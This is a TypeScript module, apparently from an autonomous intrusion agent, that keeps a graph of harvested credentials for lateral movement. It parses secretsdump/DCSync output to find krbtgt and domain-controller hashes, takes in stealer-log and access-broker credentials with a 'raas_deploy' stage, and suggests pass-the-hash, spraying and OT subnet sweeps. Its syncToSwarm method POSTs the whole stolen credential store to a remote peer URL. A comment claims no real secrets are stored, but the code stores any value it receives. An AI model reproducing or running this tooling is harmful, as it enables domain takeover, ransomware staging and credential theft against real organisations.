/**
 * @module credential_graph
 * Credential vault + pivot chain engine — harvests feed graph edges for lateral movement.
 */
import * as fs from "node:fs"
import * as path from "node:path"
import { fileURLToPath } from "node:url"
import type { AttackSurfaceGraph } from "./attack_surface.ts"
import { extractDomainSid, parseSecretsdumpOutput } from "./cred_parse.ts"

const DEFAULT_CRED_GRAPH_PATH = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../.ourmine/agent/credential_graph.json",
)

export type CredentialType = "password" | "nthash" | "ticket" | "token" | "key" | "cookie"

export type CredentialSource = string | "stealer_log" | "iab_market"

export type CredentialRole = "krbtgt" | "dc_machine" | "domain_sid" | "user" | "service" | "generic"

export interface DomainContext {
  domain?: string
  domainSid?: string
  dcHost?: string
  dcName?: string
}

export interface CredentialNode {
  id: string
  type: CredentialType
  source: CredentialSource
  username?: string
  domain?: string
  host?: string
  value: string
  discoveredAt: string
  used: boolean
  role?: CredentialRole
  iabStage?: "stealer_log" | "vpn_session" | "raas_deploy"
}

export interface PivotEdge {
  from: string
  to: string
  method: string
  credentialId: string
  success: boolean
}

export interface BloodHoundPathRef {
  start: string
  end: string
  nodes: string[]
  targetHosts: string[]
}

export class CredentialGraph {
  private creds = new Map<string, CredentialNode>()
  private pivots: PivotEdge[] = []
  private bloodhoundPaths: BloodHoundPathRef[] = []
  private bloodhoundExportPath?: string
  private domainContext: DomainContext = {}

  addCredential(cred: Omit<CredentialNode, "id" | "discoveredAt" | "used">): CredentialNode {
    const id = `cred_${this.creds.size + 1}_${Date.now()}`
    const node: CredentialNode = {
      ...cred,
      id,
      discoveredAt: new Date().toISOString(),
      used: false,
    }
    this.creds.set(id, node)
    if (cred.domain) this.domainContext.domain = cred.domain
    if (cred.role === "dc_machine" && cred.username) this.domainContext.dcName = cred.username.replace(/\$$/, "")
    if (cred.host) this.domainContext.dcHost = cred.host
    return node
  }

  /** Stealer-log / IAB market synthetic credential — never stores real secrets. */
  addStealerCredential(cred: {
    type: CredentialType
    source: "stealer_log" | "iab_market"
    username?: string
    value: string
    host?: string
    iabStage?: CredentialNode["iabStage"]
  }): CredentialNode {
    return this.addCredential({
      ...cred,
      role: "generic",
    })
  }

  /** Pivot candidates from stealer-log / IAB sources. */
  iabPivotCandidates(): CredentialNode[] {
    return [...this.creds.values()].filter(
      (c) => c.source === "stealer_log" || c.source === "iab_market",
    )
  }

  setDomainContext(ctx: DomainContext): void {
    this.domainContext = { ...this.domainContext, ...ctx }
  }

  getDomainContext(): DomainContext {
    return { ...this.domainContext }
  }

  findKrbtgtHash(domain?: string): string | undefined {
    const d = (domain ?? this.domainContext.domain)?.toUpperCase()
    for (const c of this.creds.values()) {
      if (c.role === "krbtgt" || c.username?.toLowerCase() === "krbtgt") {
        if (!d || !c.domain || c.domain.toUpperCase() === d) return c.value
      }
    }
    return undefined
  }

  findDcMachineHash(domain?: string): string | undefined {
    const d = (domain ?? this.domainContext.domain)?.toUpperCase()
    for (const c of this.creds.values()) {
      if (c.role === "dc_machine" || (c.username?.endsWith("$") && /^dc/i.test(c.username))) {
        if (!d || !c.domain || c.domain.toUpperCase() === d) return c.value
      }
    }
    return undefined
  }

  getAdContext(): DomainContext & { krbtgtHash?: string; dcMachineHash?: string } {
    return {
      ...this.domainContext,
      krbtgtHash: this.findKrbtgtHash(),
      dcMachineHash: this.findDcMachineHash(),
    }
  }

  /** Parse impacket secretsdump / DCSync output into typed graph nodes. */
  ingestSecretsdumpOutput(output: string, opts: { source?: string; domain?: string; host?: string } = {}): number {
    let added = 0
    const sid = extractDomainSid(output)
    if (sid) this.domainContext.domainSid = sid

    for (const acct of parseSecretsdumpOutput(output)) {
      const domain = opts.domain ?? acct.domain
      this.addCredential({
        type: "nthash",
        source: opts.source ?? "secretsdump",
        username: acct.username,
        domain,
        host: opts.host,
        value: acct.ntHash,
        role: acct.role === "user" ? "generic" : acct.role,
      })
      added++
      if (acct.role === "krbtgt") this.domainContext.domain = domain
      if (acct.role === "dc_machine") {
        this.domainContext.domain = domain
        this.domainContext.dcName = acct.username.replace(/\$$/, "")
      }
    }
    return added
  }

  listCredentials(host?: string): CredentialNode[] {
    const all = [...this.creds.values()]
    return host ? all.filter((c) => !c.host || c.host === host) : all
  }

  unusedForHost(host: string): CredentialNode[] {
    return this.listCredentials(host).filter((c) => !c.used)
  }

  markUsed(id: string): void {
    const c = this.creds.get(id)
    if (c) c.used = true
  }

  recordPivot(edge: Omit<PivotEdge, "success"> & { success?: boolean }): PivotEdge {
    const pivot: PivotEdge = { ...edge, success: edge.success ?? false }
    this.pivots.push(pivot)
    if (edge.success) this.markUsed(edge.credentialId)
    return pivot
  }

  suggestPivots(graph: AttackSurfaceGraph): Array<{ host: string; tool: string; credId: string; reason: string }> {
    const summary = graph.summary()
    const suggestions: Array<{ host: string; tool: string; credId: string; reason: string }> = []

    for (const bh of this.bloodhoundPaths.slice(0, 5)) {
      for (const host of bh.targetHosts) {
        const cred = this.unusedForHost("")[0]
        if (cred) {
          suggestions.push({
            host,
            tool: "pivot_replay",
            credId: cred.id,
            reason: `BloodHound path ${bh.start} → ${bh.end} via ${host}`,
          })
        }
      }
    }

    for (const cred of this.unusedForHost("")) {
      const hosts = [graph.summary().target ?? "unknown"]
      if (cred.type === "nthash" || cred.type === "password") {
        for (const host of hosts) {
          suggestions.push({
            host,
            tool: cred.type === "nthash" ? "lateral_move" : "cred_spray",
            credId: cred.id,
            reason: `${cred.type} from ${cred.source} → ${host}`,
          })
        }
      }
      if (cred.type === "token") {
        suggestions.push({
          host: cred.host ?? "cloud",
          tool: "cloud_token",
          credId: cred.id,
          reason: `OAuth/cloud token from ${cred.source}`,
        })
      }
    }

    return suggestions.slice(0, 10)
  }

  injectIntoGraph(graph: AttackSurfaceGraph): void {
    for (const cred of this.creds.values()) {
      const host = cred.host ?? graph.summary().target ?? "unknown"
      const asset = graph.upsertAsset(host)
      asset.notes.push(`[CRED] ${cred.type} ${cred.username ?? ""}@${cred.domain ?? host} (source: ${cred.source})`)
    }
  }

  toJSON(): {
    credentials: CredentialNode[]
    pivots: PivotEdge[]
    bloodhoundPaths: BloodHoundPathRef[]
    bloodhoundExportPath?: string
    domainContext?: DomainContext
  } {
    return {
      credentials: [...this.creds.values()],
      pivots: this.pivots,
      bloodhoundPaths: this.bloodhoundPaths,
      bloodhoundExportPath: this.bloodhoundExportPath,
      domainContext: Object.keys(this.domainContext).length ? this.domainContext : undefined,
    }
  }

  static fromJSON(data: {
    credentials?: CredentialNode[]
    pivots?: PivotEdge[]
    bloodhoundPaths?: BloodHoundPathRef[]
    bloodhoundExportPath?: string
    domainContext?: DomainContext
  }): CredentialGraph {
    const g = new CredentialGraph()
    for (const c of data.credentials ?? []) g.creds.set(c.id, c)
    g.pivots = data.pivots ?? []
    g.bloodhoundPaths = data.bloodhoundPaths ?? []
    g.bloodhoundExportPath = data.bloodhoundExportPath
    g.domainContext = data.domainContext ?? {}
    return g
  }

  ingestBloodHoundPaths(paths: BloodHoundPathRef[], exportPath?: string): number {
    this.bloodhoundPaths = paths
    if (exportPath) this.bloodhoundExportPath = exportPath
    return paths.length
  }

  getBloodHoundPaths(): BloodHoundPathRef[] {
    return [...this.bloodhoundPaths]
  }

  /** Hosts discovered via BloodHound path analysis. */
  bloodhoundTargetHosts(): string[] {
    const hosts = new Set<string>()
    for (const p of this.bloodhoundPaths) {
      for (const h of p.targetHosts) hosts.add(h)
    }
    return [...hosts]
  }

  private static readonly PRIVATE_IP = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/

  /** Private hosts seen in cred harvest, pivots, or BloodHound paths. */
  discoveredHosts(): string[] {
    const hosts = new Set<string>()
    for (const c of this.creds.values()) {
      if (c.host && CredentialGraph.PRIVATE_IP.test(c.host)) hosts.add(c.host)
    }
    for (const p of this.pivots) {
      if (CredentialGraph.PRIVATE_IP.test(p.to)) hosts.add(p.to)
    }
    for (const h of this.bloodhoundTargetHosts()) {
      if (CredentialGraph.PRIVATE_IP.test(h)) hosts.add(h)
    }
    return [...hosts]
  }

  /** Adjacent /24 plant subnets inferred from discovered private hosts. */
  inferOtSubnets(): string[] {
    const subnets = new Set<string>()
    for (const h of this.discoveredHosts()) {
      const m = h.match(/^(\d+\.\d+\.\d+)\.\d+$/)
      if (m) subnets.add(`${m[1]}.0/24`)
    }
    return [...subnets].slice(0, 16)
  }

  /** Suggest OT sweeps when IT foothold exposes adjacent VLANs. */
  suggestOtPivotSweep(): Array<{ subnet: string; reason: string }> {
    return this.inferOtSubnets().map((subnet) => ({
      subnet,
      reason: "cred-graph private host on adjacent /24 — OT sweep recommended",
    }))
  }

  /** Ingest credentials from post-ex harvest JSON output. */
  ingestFromPostExOutput(output: string, source = "postex_harvest"): number {
    let added = 0
    try {
      const findings = JSON.parse(output) as Array<{ category?: string; name?: string; value?: string; path?: string }>
      for (const f of findings) {
        if (f.category !== "credential") continue
        const isHash = /^\$[0-9a-z]+\$/.test(f.value ?? "") || (f.name ?? "").includes("shadow")
        this.addCredential({
          type: isHash ? "nthash" : "password",
          source,
          username: f.name,
          host: undefined,
          value: (f.value ?? "").slice(0, 200),
        })
        added++
      }
    } catch { /* non-json output */ }
    return added
  }

  /** Record successful lateral auth as pivot edge. */
  ingestLateralResult(host: string, output: string, credId?: string): void {
    try {
      const result = JSON.parse(output) as { success?: boolean; method?: string }
      if (result.success && credId) {
        this.recordPivot({ from: "local", to: host, method: result.method ?? "lateral", credentialId: credId, success: true })
      }
    } catch { /* ignore */ }
  }

  /** Persist credential graph to disk for cross-session engagement continuity. */
  save(filePath?: string): string {
    const fp = filePath ?? DEFAULT_CRED_GRAPH_PATH
    fs.mkdirSync(path.dirname(fp), { recursive: true })
    fs.writeFileSync(fp, JSON.stringify(this.toJSON(), null, 2))
    return fp
  }

  /** Load credential graph from disk. */
  static load(filePath?: string): CredentialGraph {
    const fp = filePath ?? DEFAULT_CRED_GRAPH_PATH
    if (!fs.existsSync(fp)) return new CredentialGraph()
    try {
      return CredentialGraph.fromJSON(JSON.parse(fs.readFileSync(fp, "utf8")))
    } catch {
      return new CredentialGraph()
    }
  }

  async syncToSwarm(peerUrl: string, bearerToken?: string, live = false): Promise<{ synced: boolean; count: number; error?: string }> {
    const payload = JSON.stringify(this.toJSON());
    if (!live) {
      return { synced: false, count: this.creds.size, error: "live=true required for peer swarm sync" };
    }
    try {
      const headers: Record<string, string> = { "Content-Type": "application/json" };
      if (bearerToken) headers["Authorization"] = `Bearer ${bearerToken}`;
      const res = await fetch(peerUrl, { method: "POST", headers, body: payload });
      return { synced: res.ok, count: this.creds.size, error: res.ok ? undefined : `HTTP ${res.status}` };
    } catch (e) {
      return { synced: false, count: this.creds.size, error: String(e) };
    }
  }

  ingestSwarmBlob(blobJson: string): number {
    let added = 0;
    try {
      const data = JSON.parse(blobJson) as { credentials?: CredentialNode[]; pivots?: PivotEdge[] };
      for (const c of data.credentials ?? []) {
        if (!this.creds.has(c.id)) {
          this.creds.set(c.id, c);
          added++;
        }
      }
      for (const p of data.pivots ?? []) {
        if (!this.pivots.some((existing) => existing.from === p.from && existing.to === p.to && existing.method === p.method)) {
          this.pivots.push(p);
        }
      }
    } catch {
      // malformed blob
    }
    return added;
  }
}

export default { CredentialGraph }
